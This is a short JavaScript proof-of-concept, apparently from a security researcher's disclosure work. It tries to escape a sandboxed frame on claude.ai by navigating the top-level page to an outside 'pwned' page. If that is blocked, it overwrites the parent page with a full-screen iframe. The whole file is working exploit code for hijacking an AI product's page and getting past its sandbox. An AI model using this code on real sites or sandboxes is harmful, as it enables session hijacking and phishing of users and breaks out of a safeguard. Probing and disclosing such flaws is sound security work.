// Sandbox Escape Probe v8 - Full Page Takeover
// Researcher: Sagi Layani, Oasis Security
// Navigates window.top (claude.ai) to our takeover page

async function poc() {
  console.log("=== SANDBOX ESCAPE PoC v8 - Full Page Takeover ===");
  console.log("Researcher: Sagi Layani, Oasis Security\n");

  // Navigate the TOP frame (claude.ai) to our takeover page
  // Cross-origin frames CAN set window.top.location for navigation
  console.log("[1] Hijacking top-level page navigation...");
  try {
    window.top.location = 'https://claude.sagilayani.com/pwned.html';
    console.log("[1] SUCCESS: Navigated top frame to takeover page");
  } catch(e) {
    console.log("[1] top.location blocked:", e.message);
    // Fallback: try from parent context
    try {
      window.parent.top.location = 'https://claude.sagilayani.com/pwned.html';
      console.log("[1] SUCCESS via parent.top");
    } catch(e2) {
      console.log("[1] parent.top also blocked:", e2.message);
      // Final fallback: take over parent frame
      console.log("[1] Falling back to parent frame takeover...");
      window.parent.document.body.innerHTML = '<iframe src="https://claude.sagilayani.com/pwned.html" style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647"></iframe>';
    }
  }
}

poc().catch(e => console.error("POC failed:", e));
